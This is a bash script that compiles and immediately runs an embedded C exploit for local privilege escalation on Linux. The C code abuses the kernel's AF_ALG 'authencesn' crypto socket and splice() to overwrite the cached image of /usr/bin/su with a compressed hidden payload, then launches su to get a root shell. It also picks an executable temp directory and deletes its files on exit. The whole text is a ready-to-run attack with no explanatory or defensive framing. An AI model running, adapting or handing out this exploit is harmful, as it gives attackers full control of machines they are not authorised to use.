#!/bin/bash

set -e

bad_mount() {
    local opts
    opts=$(awk -v m="$1" '$2 == m {print $4}' /proc/mounts | head -1)
    case ",$opts," in *",noexec,"*|*",ro,"*) return 0;; esac
    return 1
}

BASE=""
for d in /dev/shm /tmp; do
    [ -d "$d" ] && [ -w "$d" ] && ! bad_mount "$d" && { BASE="$d"; break; }
done
TMPDIR=$(mktemp -d "${BASE:+$BASE/}exp.XXXXXX" 2>/dev/null || mktemp -d)
trap "rm -rf $TMPDIR" EXIT

gcc -x c - -lz -o "$TMPDIR/exploit" << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/socket.h>
#include <linux/if_alg.h>
#include <sys/uio.h>
#include <zlib.h>

#define ALG_SET_KEY 279

static const char PAYLOAD_COMPRESSED_HEX[] = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";

static long do_splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags) {
    return syscall(SYS_splice, fd_in, off_in, fd_out, off_out, len, flags);
}

static void hex_to_bytes(const char *hex, unsigned char *out, size_t out_len) {
    for (size_t i = 0; i < out_len; i++) {
        sscanf(hex + i * 2, "%2hhx", out + i);
    }
}

static void exploit_step(int fd, int offset, const unsigned char *data, int data_len) {
    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    struct sockaddr_alg addr;
    memset(&addr, 0, sizeof(addr));
    addr.salg_family = AF_ALG;
    memcpy(addr.salg_type, "aead", 4);
    strcpy(addr.salg_name, "authencesn(hmac(sha256),cbc(aes))");

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        exit(1);
    }

    unsigned char key[40];
    memset(key, 0, sizeof(key));
    key[0] = 0x08;
    key[1] = 0x00;
    key[2] = 0x01;
    key[3] = 0x00;
    key[7] = 0x10;

    if (setsockopt(sock, ALG_SET_KEY, 1, key, sizeof(key)) < 0) {
        perror("setsockopt key");
        close(sock);
        exit(1);
    }

    if (setsockopt(sock, SOL_ALG, 5, NULL, 4) < 0) {
        perror("setsockopt 5");
        close(sock);
        exit(1);
    }

    int conn = accept(sock, NULL, NULL);
    if (conn < 0) {
        perror("accept");
        close(sock);
        exit(1);
    }

    unsigned char msg_buf[8];
    memset(msg_buf, 'A', 4);
    int chunk = data_len > 4 ? 4 : data_len;
    memcpy(msg_buf + 4, data, chunk);

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    struct iovec iov = { msg_buf, 4 + chunk };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    char cmsgbuf[512];
    memset(cmsgbuf, 0, sizeof(cmsgbuf));
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = 3;
    cmsg->cmsg_len = CMSG_LEN(4);
    memset(CMSG_DATA(cmsg), 0, 4);

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = 2;
    cmsg->cmsg_len = CMSG_LEN(20);
    unsigned char *p = CMSG_DATA(cmsg);
    p[0] = 0x10;
    memset(p + 1, 0, 19);

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = 4;
    cmsg->cmsg_len = CMSG_LEN(4);
    p = CMSG_DATA(cmsg);
    p[0] = 0x08;
    memset(p + 1, 0, 3);

    msg.msg_controllen = CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4);

    if (sendmsg(conn, &msg, 32768) < 0) {
        perror("sendmsg");
    }

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        exit(1);
    }

    loff_t off_in = 0;
    do_splice(fd, &off_in, pipefd[1], NULL, offset + 4, 0);
    do_splice(pipefd[0], NULL, conn, NULL, offset + 4, 0);

    char buf[1024];
    recv(conn, buf, 8 + offset, 0);

    close(conn);
    close(sock);
    close(pipefd[0]);
    close(pipefd[1]);
}

int main() {
    int su_fd = open("/usr/bin/su", O_RDONLY);
    if (su_fd < 0) {
        perror("open /usr/bin/su");
        return 1;
    }

    size_t hex_len = strlen(PAYLOAD_COMPRESSED_HEX);
    size_t comp_len = hex_len / 2;
    unsigned char *compressed = malloc(comp_len);
    hex_to_bytes(PAYLOAD_COMPRESSED_HEX, compressed, comp_len);

    uLongf dlen = 1024 * 1024;
    unsigned char *decompressed = malloc(dlen);
    if (uncompress(decompressed, &dlen, compressed, comp_len) != Z_OK) {
        fprintf(stderr, "decompress failed\n");
        return 1;
    }

    for (int i = 0; i < dlen; i += 4) {
        int chunk = (i + 4 <= dlen) ? 4 : (dlen - i);
        exploit_step(su_fd, i, decompressed + i, chunk);
    }

    system("su");
    return 0;
}
CEOF

"$TMPDIR/exploit"
